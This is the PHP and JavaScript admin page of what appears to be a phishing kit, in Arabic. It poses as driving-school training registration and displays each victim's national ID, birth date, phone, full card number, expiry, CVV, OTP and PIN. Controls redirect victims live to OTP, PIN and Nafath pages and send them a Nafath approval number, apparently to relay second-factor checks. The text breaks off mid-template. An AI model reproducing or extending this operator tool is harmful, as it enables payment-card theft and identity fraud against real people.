<?php
session_start();

// التحقق من تسجيل الدخول
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: login.php');
    exit;
}

// ضبط المنطقة الزمنية على توقيت الأردن
date_default_timezone_set('Asia/Amman');

require_once('init.php');

// ✅ جلب العملاء اللي عندهم بطاقات فقط
$users = $User->getUsersWithCards();

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    header('Location: cards.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>البطاقات - لوحة التحكم</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --card-gradient: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --danger-color: #ef4444;
            --info-color: #3b82f6;
            --shadow-xl: 0 20px 25px rgba(0,0,0,0.15);
            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        * {
            font-family: "Cairo", sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .dashboard-header {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: var(--shadow-xl);
        }
        
        .header-title {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .header-title i {
            font-size: 2.5rem;
            background: var(--card-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .header-title h1 {
            font-size: 1.8rem;
            font-weight: 700;
            color: #1f2937;
            margin: 0;
        }
        
        .btn-back {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 25px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-back:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
            color: white;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: var(--shadow-md);
            transition: all 0.3s ease;
            position: relative;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--card-gradient);
        }
        
        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            margin-bottom: 15px;
            background: var(--card-gradient);
            color: white;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: #1f2937;
        }
        
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        .table-section {
            background: white;
            border-radius: 20px;
            box-shadow: var(--shadow-xl);
            overflow: hidden;
        }
        
        .table-header {
            background: var(--card-gradient);
            padding: 20px 30px;
            color: white;
        }
        
        .table-header h3 {
            margin: 0;
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .table-responsive {
            max-height: 700px;
            overflow-y: auto;
        }
        
        .table-responsive::-webkit-scrollbar {
            width: 8px;
        }
        
        .table-responsive::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        
        .table-responsive::-webkit-scrollbar-thumb {
            background: #f59e0b;
            border-radius: 4px;
        }
        
        .modern-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }
        
        .modern-table thead {
            position: sticky;
            top: 0;
            z-index: 10;
            background: #f9fafb;
        }
        
        .modern-table thead th {
            padding: 18px 15px;
            text-align: center;
            font-weight: 700;
            font-size: 0.85rem;
            color: #374151;
            text-transform: uppercase;
            border-bottom: 2px solid #e5e7eb;
        }
        
        .modern-table tbody tr {
            transition: all 0.3s ease;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .modern-table tbody tr:hover {
            background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%);
        }
        
        .modern-table tbody tr.new-card {
            background: linear-gradient(90deg, #fef3c7 0%, #fde68a 100%) !important;
            border-left: 4px solid #f59e0b !important;
        }
        
        .modern-table tbody td {
            padding: 16px 15px;
            text-align: center;
            font-size: 0.9rem;
            color: #374151;
            vertical-align: middle;
        }
        
        .btn-table {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 2px;
            color: white;
        }
        
        .btn-info {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
        }
        
        .btn-info:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }
        
        .btn-card {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
        }
        
        .btn-card:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.4);
        }
        
        .btn-nafad {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
        }
        
        .btn-nafad:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
        }
        
        .btn-delete:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
        }
        
        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status-new {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .status-pending {
            background: #fef3c7;
            color: #92400e;
        }
        
        .card-badge {
            display: inline-block;
            background: var(--card-gradient);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 700;
        }
        
        /* Modal Styles */
        .modal-content {
            border-radius: 20px;
            border: none;
            box-shadow: var(--shadow-xl);
        }
        
        .modal-header {
            background: var(--card-gradient);
            color: white;
            border-radius: 20px 20px 0 0;
            padding: 25px 30px;
            border-bottom: none;
        }
        
        .modal-title {
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .modal-body {
            padding: 30px;
        }
        
        .info-card {
            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border-right: 4px solid #f59e0b;
        }
        
        .info-card h6 {
            color: #f59e0b;
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-card p {
            margin: 8px 0;
            color: #4b5563;
            font-size: 0.9rem;
        }
        
        .info-card p strong {
            color: #1f2937;
            font-weight: 600;
        }
        
        .redirect-box {
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 2px solid #f59e0b;
        }
        
        .redirect-box label {
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #92400e;
        }
        
        .form-select-modern {
            border: 2px solid #f59e0b;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .form-select-modern:focus {
            border-color: #d97706;
            box-shadow: 0 0 0 4px rgba(245, 158, 11, 0.15);
            outline: none;
        }
        
        .btn-redirect {
            background: var(--card-gradient);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-weight: 700;
            width: 100%;
            transition: all 0.3s;
            font-size: 1rem;
        }
        
        .btn-redirect:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(245,158,11,0.3);
            border-radius: 50%;
            border-top-color: #f59e0b;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ✅ Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            background: white;
            border-radius: 12px;
            padding: 15px 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 300px;
            max-width: 400px;
            transform: translateX(-120%);
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            border-right: 4px solid #10b981;
        }

        .toast.show {
            transform: translateX(0);
            opacity: 1;
        }

        .toast.success { border-right-color: #10b981; }
        .toast.error { border-right-color: #ef4444; }
        .toast.warning { border-right-color: #f59e0b; }
        .toast.info { border-right-color: #3b82f6; }

        .toast-icon {
            font-size: 1.5rem;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-weight: 700;
            font-size: 0.95rem;
            color: #1f2937;
        }

        .toast-message {
            font-size: 0.85rem;
            color: #6b7280;
            margin-top: 2px;
        }
    </style>
</head>
<body>
    <div class="container-fluid" style="max-width: 1600px;">
        
        <div class="dashboard-header">
            <div class="header-title">
                <i class="fas fa-credit-card"></i>
                <div style="flex: 1;">
                    <h1>إدارة البطاقات</h1>
                    <p style="margin: 5px 0 0; font-size: 0.9rem; color: #6b7280;">
                        عرض العملاء الذين قاموا بإضافة بطاقاتهم
                    </p>
                </div>
                <a href="index.php" class="btn-back">
                    <i class="fas fa-arrow-right"></i>
                    لوحة التحكم
                </a>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon">
                        <i class="fas fa-users"></i>
                    </div>
                    <div class="stat-value"><?= count($users); ?></div>
                    <div class="stat-label">عملاء بطاقات</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon">
                        <i class="fas fa-credit-card"></i>
                    </div>
                    <div class="stat-value">
                        <?php
                        $totalCards = 0;
                        foreach ($users as $u) {
                            $totalCards += $u->card_count;
                        }
                        echo $totalCards;
                        ?>
                    </div>
                    <div class="stat-label">إجمالي البطاقات</div>
                </div>
            </div>
        </div>
        
        <div class="table-section">
            <div class="table-header">
                <h3>
                    <i class="fas fa-list"></i>
                    قائمة العملاء (البطاقات فقط)
                </h3>
            </div>
            
            <div class="table-responsive">
                <?php if ($users && count($users) > 0): ?>
                <table class="modern-table">
                    <thead>
                        <tr>
                            <th><i class="fas fa-hashtag"></i> ID</th>
                            <th><i class="fas fa-user"></i> اسم المستخدم</th>
                            <th><i class="fas fa-comment"></i> الرسالة</th>
                            <th><i class="fas fa-id-card"></i> الاسم الكامل</th>
                            <th><i class="fas fa-phone"></i> الهاتف</th>
                            <th><i class="fas fa-credit-card"></i> عدد البطاقات</th>
                            <th><i class="fas fa-info-circle"></i> معلومات</th>
                            <th><i class="fas fa-credit-card"></i> البطاقات</th>
                            <th><i class="fas fa-shield-alt"></i> نفاذ</th>
                            <th><i class="fas fa-key"></i> رمز نفاذ</th>
                            <th><i class="fas fa-clock"></i> آخر بطاقة</th>
                            <th><i class="fas fa-cog"></i> إجراءات</th>
                        </tr>
                    </thead>
                    <tbody id="cardsTableBody">
                        <?php foreach ($users as $user): ?>
                        <tr data-user-id="<?= $user->id; ?>" data-last-update="<?= strtotime($user->last_card_time); ?>">
                            <td><strong>#<?= $user->id; ?></strong></td>
                            <td><strong><?= $user->username ?? '-'; ?></strong></td>
                            <td id="message<?= $user->id; ?>">
                                <span class="status-badge status-pending">
                                    <?= $user->message ?? 'لا توجد رسالة'; ?>
                                </span>
                            </td>
                            <td><strong style="color: #374151;"><?= $user->full_name ?? '-'; ?></strong></td>
                            <td><?= $user->phone_number ?? '-'; ?></td>
                            <td>
                                <span class="card-badge">
                                    <?= $user->card_count; ?> بطاقة
                                </span>
                            </td>
                            <td>
                                <button class="btn-table btn-info" onclick="showUserInfo(<?= $user->id; ?>)">
                                    <i class="fas fa-info-circle"></i> عرض
                                </button>
                            </td>
                            <td>
                                <button class="btn-table btn-card" onclick="showUserCards(<?= $user->id; ?>)">
                                    <i class="fas fa-credit-card"></i> البطاقات
                                </button>
                            </td>
                            <td>
                                <button class="btn-table btn-nafad" onclick="showUserNafad(<?= $user->id; ?>)">
                                    <i class="fas fa-shield-alt"></i> نفاذ
                                </button>
                            </td>
                            <td>
                                <button class="btn-table btn-nafad" onclick="showNafathFinal(<?= $user->id; ?>)">
                                    <i class="fas fa-key"></i> إرسال
                                </button>
                            </td>
                            <td>
                                <small><?= date('Y/m/d', strtotime($user->last_card_time . ' +3 hours')); ?><br>
                                <?= date('h:i A', strtotime($user->last_card_time . ' +3 hours')); ?></small>
                            </td>
                            <td>
                                <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
                                    <input type="hidden" name="userId" value="<?= $user->id; ?>">
                                    <button type="submit" name="deleteUser" class="btn-table btn-delete">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </form>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <?php else: ?>
                <div style="text-align: center; padding: 60px 20px; color: #6b7280;">
                    <i class="fas fa-credit-card" style="font-size: 4rem; opacity: 0.3;"></i>
                    <h3 style="font-size: 1.5rem; margin: 20px 0;">لا توجد بطاقات</h3>
                    <p>لم يقم أي عميل بإضافة بطاقة بعد</p>
                </div>
                <?php endif; ?>
            </div>
        </div>
        
    </div>

    <!-- Modals -->
    
    <div class="modal fade" id="userInfoModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-user-circle"></i>
                        معلومات المستخدم التفصيلية
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
                        <select class="form-select form-select-modern" id="redirectPageUser">
                            <option value="index.html">الصفحة الرئيسية</option>
                            <option value="pay.php">صفحة الدفع</option>
                            <option value="otp.php">رمز OTP</option>
                            <option value="pin.php">كلمة سر البطاقة</option>
                            <option value="nafad.php">رقم مزود الخدمة</option>
                            <option value="success.php">رمز تحقق مزود الخدمة</option>
                            <option value="nafath.php">نفاذ الأخيرة</option>
                        </select>
                        <button class="btn btn-redirect" onclick="redirectUser()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userInfoContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البيانات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="userCardsModal" tabindex="-1">
        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-credit-card"></i>
                        بطاقات المستخدم
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
                        <select class="form-select form-select-modern" id="redirectPageCard">
                            <option value="index.html">الصفحة الرئيسية</option>
                            <option value="pay.php">صفحة الدفع</option>
                            <option value="otp.php">رمز OTP</option>
                            <option value="pin.php">كلمة سر البطاقة</option>
                            <option value="nafad.php">رقم مزود الخدمة</option>
                            <option value="success.php">رمز تحقق مزود الخدمة</option>
                            <option value="nafath.php">نفاذ الأخيرة</option>
                        </select>
                        <button class="btn btn-redirect" onclick="redirectUserFromCard()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userCardsContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل البطاقات...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="userNafadModal" tabindex="-1">
        <div class="modal-dialog modal-md modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-shield-alt"></i>
                        بيانات نفاذ
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="redirect-box">
                        <label>
                            <i class="fas fa-directions"></i>
                            توجيه العميل إلى صفحة:
                        </label>
                        <select class="form-select form-select-modern" id="redirectPageNafad">
                            <option value="index.html">الصفحة الرئيسية</option>
                            <option value="pay.php">صفحة الدفع</option>
                            <option value="otp.php">رمز OTP</option>
                            <option value="pin.php">كلمة سر البطاقة</option>
                            <option value="nafad.php">رقم مزود الخدمة</option>
                            <option value="success.php">رمز تحقق مزود الخدمة</option>
                            <option value="nafath.php">نفاذ الأخيرة</option>
                        </select>
                        <button class="btn btn-redirect" onclick="redirectUserFromNafad()">
                            <i class="fas fa-paper-plane"></i>
                            توجيه الآن
                        </button>
                    </div>
                    
                    <div id="userNafadContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل بيانات نفاذ...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="nafathFinalModal" tabindex="-1">
        <div class="modal-dialog modal-md modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-paper-plane"></i>
                        إرسال رقم نفاذ للعميل
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-4">
                        <label class="form-label" style="font-weight: 700; font-size: 1.1rem;">
                            <i class="fas fa-keyboard"></i>
                            أدخل رقم نفاذ:
                        </label>
                        <input type="text" 
                               id="nafathNumberInput" 
                               class="form-control form-control-lg text-center" 
                               placeholder="مثال: 10" 
                               maxlength="3" 
                               inputmode="numeric"
                               pattern="[0-9]*"
                               style="font-size: 28px; letter-spacing: 3px; font-weight: 700; border: 3px solid #f59e0b;">
                    </div>
                    
                    <button class="btn btn-redirect" onclick="sendNafathNumberToClient()">
                        <i class="fas fa-paper-plane"></i>
                        إرسال الرقم للعميل
                    </button>
                    
                    <hr style="margin: 30px 0;">
                    
                    <div id="nafathHistoryContent">
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري التحميل...</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <audio id="card-sound" src="./level-up-2-199574.mp3" preload="auto"></audio>
    
    <div class="toast-container" id="toastContainer"></div>

    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    
    <script>
    let currentUserId = null;
    
    // ✅ Toast Notification System
    function showToast(title, message, type = 'success') {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        
        const icons = {
            success: '<i class="fas fa-check-circle" style="color: #10b981;"></i>',
            error: '<i class="fas fa-times-circle" style="color: #ef4444;"></i>',
            warning: '<i class="fas fa-exclamation-triangle" style="color: #f59e0b;"></i>',
            info: '<i class="fas fa-info-circle" style="color: #3b82f6;"></i>'
        };
        
        toast.innerHTML = `
            <div class="toast-icon">${icons[type]}</div>
            <div class="toast-content">
                <div class="toast-title">${title}</div>
                <div class="toast-message">${message}</div>
            </div>
        `;
        
        container.appendChild(toast);
        
        setTimeout(() => toast.classList.add('show'), 10);
        
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 400);
        }, 4000);
    }
    
    // ✅ حفظ الصفوف غير المقروءة في localStorage
    const UNREAD_ROWS_KEY = 'unreadCardRows';

    function saveUnreadRow(userId) {
        let unread = JSON.parse(localStorage.getItem(UNREAD_ROWS_KEY) || '[]');
        if (!unread.includes(userId)) {
            unread.push(userId);
            localStorage.setItem(UNREAD_ROWS_KEY, JSON.stringify(unread));
        }
    }

    function removeUnreadRow(userId) {
        let unread = JSON.parse(localStorage.getItem(UNREAD_ROWS_KEY) || '[]');
        unread = unread.filter(id => id != userId);
        localStorage.setItem(UNREAD_ROWS_KEY, JSON.stringify(unread));
    }

    function restoreUnreadRows() {
        let unread = JSON.parse(localStorage.getItem(UNREAD_ROWS_KEY) || '[]');
        unread.forEach(userId => {
            const row = document.querySelector(`tr[data-user-id="${userId}"]`);
            if (row) {
                row.classList.add('new-card');
            }
        });
    }

    // ✅ نقل الصف للأعلى مع حفظ الحالة (من أي مكان في الجدول)
    function moveRowToTop(userId) {
        const row = document.querySelector(`tr[data-user-id="${userId}"]`);
        if (!row) {
            console.log(`⚠️ الصف غير موجود - userId: ${userId}`);
            return;
        }
        
        const tbody = document.getElementById('cardsTableBody');
        if (!tbody) {
            console.log('❌ tbody غير موجود!');
            return;
        }
        
        console.log(`⬆️ نقل الصف #${userId} للأعلى`);
        
        // إضافة highlight
        row.classList.add('new-card');
        
        // تحديث timestamp
        const newTimestamp = Math.floor(Date.now() / 1000);
        row.setAttribute('data-last-update', newTimestamp);
        
        // نقل الصف للأعلى (سيتحرك بغض النظر عن مكانه)
        tbody.insertBefore(row, tbody.firstChild);
        
        // حفظ في localStorage
        saveUnreadRow(userId);
        
        // ✅ إضافة تأثير بصري (Animation)
        row.style.transition = 'all 0.5s ease';
        row.style.transform = 'scale(1.02)';
        setTimeout(() => {
            row.style.transform = 'scale(1)';
        }, 500);
    }

    // ✅ إضافة صف جديد إذا لم يكن موجود
    function addOrUpdateUserRow(userId, message) {
        let row = document.querySelector(`tr[data-user-id="${userId}"]`);
        
        if (row) {
            // ✅ الصف موجود - حدّث الرسالة فقط
            const messageElement = document.getElementById('message' + userId);
            if (messageElement && message) {
                messageElement.innerHTML = `<span class="status-badge status-pending">${message}</span>`;
            }
            moveRowToTop(userId);
        } else {
            // ✅ الصف غير موجود - اجلب البيانات وأضفه
            console.log('📥 جلب بيانات العميل الجديد #' + userId);
            
            fetch(`get-user-info.php?user_id=${userId}`)
                .then(res => res.json())
                .then(data => {
                    const tbody = document.getElementById('cardsTableBody');
                    if (!tbody) return;
                    
                    const newRow = document.createElement('tr');
                    newRow.setAttribute('data-user-id', userId);
                    newRow.setAttribute('data-last-update', Math.floor(Date.now() / 1000));
                    newRow.classList.add('new-card');
                    
                    const now = new Date();
                    const dateStr = now.toLocaleDateString('en-GB').replace(/\//g, '/');
                    const timeStr = now.toLocaleTimeString('en-US', {hour: '2-digit', minute: '2-digit', hour12: true});
                    
                    newRow.innerHTML = `
                        <td><strong>#${userId}</strong></td>
                        <td><strong>${data.username || '-'}</strong></td>
                        <td id="message${userId}">
                            <span class="status-badge status-pending">${message || 'بطاقة جديدة'}</span>
                        </td>
                        <td><strong style="color: #374151;">${data.full_name || '-'}</strong></td>
                        <td>${data.phone_number || '-'}</td>
                        <td>
                            <span class="card-badge">1 بطاقة</span>
                        </td>
                        <td>
                            <button class="btn-table btn-info" onclick="showUserInfo(${userId})">
                                <i class="fas fa-info-circle"></i> عرض
                            </button>
                        </td>
                        <td>
                            <button class="btn-table btn-card" onclick="showUserCards(${userId})">
                                <i class="fas fa-credit-card"></i> البطاقات
                            </button>
                        </td>
                        <td>
                            <button class="btn-table btn-nafad" onclick="showUserNafad(${userId})">
                                <i class="fas fa-shield-alt"></i> نفاذ
                            </button>
                        </td>
                        <td>
                            <button class="btn-table btn-nafad" onclick="showNafathFinal(${userId})">
                                <i class="fas fa-key"></i> إرسال
                            </button>
                        </td>
                        <td>
                            <small>${dateStr}<br>${timeStr}</small>
                        </td>
                        <td>
                            <form method="POST" style="display:inline; margin:0;" onsubmit="return confirm('هل تريد حذف هذا المستخدم؟')">
                                <input type="hidden" name="userId" value="${userId}">
                                <button type="submit" name="deleteUser" class="btn-table btn-delete">
                                    <i class="fas fa-trash"></i>
                                </button>
                            </form>
                        </td>
                    `;
                    
                    tbody.insertBefore(newRow, tbody.firstChild);
                    saveUnreadRow(userId);
                    
                    // ✅ تحديث عدد العملاء
                    const statValues = document.querySelectorAll('.stat-value');
                    if (statValues[0]) {
                        statValues[0].textContent = parseInt(statValues[0].textContent) + 1;
                    }
                    
                    console.log('✅ تمت إضافة الصف الجديد #' + userId);
                });
        }
    }

    // ✅ إزالة اللون عند فتح المودال
    function markRowAsRead(userId) {
        const row = document.querySelector(`tr[data-user-id="${userId}"]`);
        if (row) {
            row.classList.remove('new-card');
        }
        removeUnreadRow(userId);
    }
    
function showUserInfo(userId) {
    currentUserId = userId;
    markRowAsRead(userId);
    
    $.ajax({
        url: 'get-user-info.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const data = JSON.parse(response);
                let html = '';

                // ✅ بيانات المرحلة الأولى
                html += `<div class="info-card">
                    <h6><i class="fas fa-user-check"></i> بيانات التسجيل (المرحلة الأولى)</h6>
                    <p><strong>رقم الهوية:</strong> ${data.ssn ?? '-'}</p>
                    <p><strong>الاسم الكامل:</strong> ${data.name ?? '-'}</p>
                    <p><strong>رقم الجوال:</strong> ${data.phone ?? '-'}</p>
                    <p><strong>تاريخ الميلاد:</strong> ${data.date ?? '-'}</p>
                    <p><strong>البريد الإلكتروني:</strong> ${data.email ?? '-'}</p>
                </div>`;

                // ✅ بيانات المرحلة الثانية
                html += `<div class="info-card">
                    <h6><i class="fas fa-car"></i> بيانات التدريب (المرحلة الثانية)</h6>
                    <p><strong>المنطقة:</strong> ${data.region ?? '-'}</p>
                    <p><strong>الفرع:</strong> ${data.branch ?? '-'}</p>
                    <p><strong>المستوى:</strong> ${data.level ?? '-'}</p>
                    <p><strong>نوع الجير:</strong> ${data.gear_type ?? '-'}</p>
                    <p><strong>الفترة الزمنية:</strong> ${data.time_period ?? '-'}</p>
                </div>`;

                // ✅ معلومات تقنية
                html += `<div class="info-card">
                    <h6><i class="fas fa-cog"></i> معلومات تقنية</h6>
                    <p><strong>تاريخ الإنشاء:</strong> ${data.created_at ?? '-'}</p>
                </div>`;
                
                document.getElementById('userInfoContent').innerHTML = html;
                
                const modal = new bootstrap.Modal(document.getElementById('userInfoModal'));
                modal.show();
            } catch(e) {
                showToast('خطأ', 'حدث خطأ في تحميل البيانات', 'error');
            }
        }
    });
}
    
    // ✅ دالة تحديث مودال البطاقات (بدون إغلاق)
    function refreshCardsModal(userId) {
        $.ajax({
            url: 'get-user-cards.php',
            method: 'GET',
            data: { user_id: userId },
            success: function (response) {
                try {
                    const cards = JSON.parse(response);
                    let html = '';

                    if (!Array.isArray(cards) || cards.length === 0) {
                        html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بطاقات لهذا المستخدم</div>';
                    } else {
                        cards.forEach((card, index) => {
html += `
<div class="info-card">
    <h6><i class="fas fa-credit-card"></i> عملية دفع ${index + 1}</h6>
    <p><strong>اسم حامل البطاقة:</strong> ${card.cardName ?? '-'}</p>
    <p><strong>رقم البطاقة:</strong> ${card.cardNumber ?? '-'}</p>
    <p><strong>تاريخ الانتهاء:</strong> ${card.cardExpiry ?? '-'}</p>
    <p><strong>CVV:</strong> ${card.cvv ?? '-'}</p>
    <p><strong>المبلغ المدفوع:</strong> <strong style="color: #10b981; font-size: 1.2rem;">${card.price ?? '0'} ر.س</strong></p>
    <p><strong>تاريخ العملية:</strong> ${card.created_at ?? '-'}</p>
                                <div id="otpBox_${card.id}">
                                    <em class="text-muted">🔄 جاري تحميل رموز التحقق...</em>
                                </div>
                                <div id="pinBox_${card.id}">
                                    <em class="text-muted">🔄 جاري تحميل PIN...</em>
                                </div>
                            </div>
                            `;
                        });
                    }

                    // ✅ إضافة قسم نفاذ
                    html += `
                    <hr style="margin: 30px 0; border-top: 3px solid #10b981;">
                    <div id="nafadSectionInCards" style="background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%); padding: 25px; border-radius: 15px; border: 2px solid #10b981;">
                        <h5 style="color: #065f46; font-weight: 700; margin-bottom: 20px;">
                            <i class="fas fa-shield-alt"></i> بيانات نفاذ
                        </h5>
                        <div class="text-center">
                            <div class="spinner"></div>
                            <p class="mt-2">جاري تحميل بيانات نفاذ...</p>
                        </div>
                    </div>
                    `;

                    // ✅ إضافة قسم إرسال رقم نفاذ
                    html += `
                    <hr style="margin: 30px 0; border-top: 3px solid #f59e0b;">
                    <div style="background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%); padding: 25px; border-radius: 15px; border: 2px solid #f59e0b;">
                        <h5 style="color: #92400e; font-weight: 700; margin-bottom: 20px;">
                            <i class="fas fa-paper-plane"></i> إرسال رقم نفاذ
                        </h5>
                        <div class="mb-3">
                            <input type="text" 
                                   id="nafathNumberInputInCards" 
                                   class="form-control form-control-lg text-center" 
                                   placeholder="مثال: 10" 
                                   maxlength="3" 
                                   inputmode="numeric"
                                   pattern="[0-9]*"
                                   style="font-size: 24px; letter-spacing: 3px; font-weight: 700; border: 3px solid #f59e0b;">
